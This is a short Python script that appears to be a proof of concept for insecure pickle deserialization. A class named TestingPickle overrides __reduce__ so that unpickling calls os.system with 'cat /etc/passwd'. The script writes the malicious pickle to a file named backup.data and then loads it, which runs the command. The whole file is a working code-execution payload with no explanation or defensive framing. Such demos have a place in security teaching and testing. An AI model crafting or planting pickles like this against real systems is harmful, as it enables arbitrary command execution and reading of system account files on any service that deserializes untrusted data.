import pickle
import os

class TestingPickle(object):
  
  def __reduce__(self):
    return (os.system, ('cat /etc/passwd', ))

serialized_data = TestingPickle()

pickle_data = pickle.dumps(serialized_data)

#Write in binary on file 
with open("backup.data", "wb") as file:
  file.write(pickle_data)

response = pickle.loads(open("backup.data","rb").read())
